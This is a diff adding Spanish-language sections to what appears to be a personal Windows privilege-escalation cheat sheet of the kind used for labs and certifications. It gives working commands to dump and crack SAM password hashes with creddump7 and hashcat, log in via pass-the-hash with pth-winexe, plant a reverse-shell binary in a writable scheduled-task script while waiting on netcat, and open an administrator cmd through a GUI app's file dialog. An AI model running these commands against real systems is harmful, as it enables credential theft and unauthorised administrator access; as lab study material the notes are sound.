@@ -148,6 +148,53 @@ runas /savecred /user:admin C:\PrivEsc\reverse.exe
 
 ########################## SAM
 
+Si podemos extraer el SAM y System (usualmente se encuentran en la carpeta windows/repair)
+
+podemos unirlos con creddump7 y extraer el hash, luego con hashcat podemos intentar romperlo:
+
+git clone https://github.com/Tib3rius/creddump7
+pip3 install pycrypto
+python3 creddump7/pwdump.py SYSTEM SAM
+
+hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+
+########################## PASSING THE HASH
+
+Si obtuvimos el hash pero no lo podemos romper, podemos loguearnos con el hash utilizando pth-winexe:
+
+pth-winexe -U 'admin%hash' //10.10.11.49 cmd.exe
+
+
+################################################################################### SCHEDULED TASKS
+
+Si encontramos un archivo que corre tareas programadas y tenemos capacidades de escritura en los mismos podemos agregegarle una ejecución a nuestro binario malicioso:
+
+accesschk.exe /accepteula -wvu "C:\PATH\To\file"
+
+La ruta al archivo maliciosa debe ser absoluta!!!
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+
+Esperamos con nuestro netcat a que se ejecute.
+
+################################################################################## INSECURE GUI APPS
+
+Si vemos que una app corre como administrador (para esto necesitamos tener un entorno gráfico) podemos usarla para correr un cmd con los mismos privilegios:
+
+Para ver con qué privilegios corre:
+tasklist /V | findstr binario_de_la_app.exe
+
+Abrimos la app y le damos open para cargar un archivo "X" y en el explorador de windows colocamos:  file://c:/windows/system32/cmd.exe (o el path al cmd.exe)
+
+
+
+
+
+
+
+
+
+
+
 
 
 
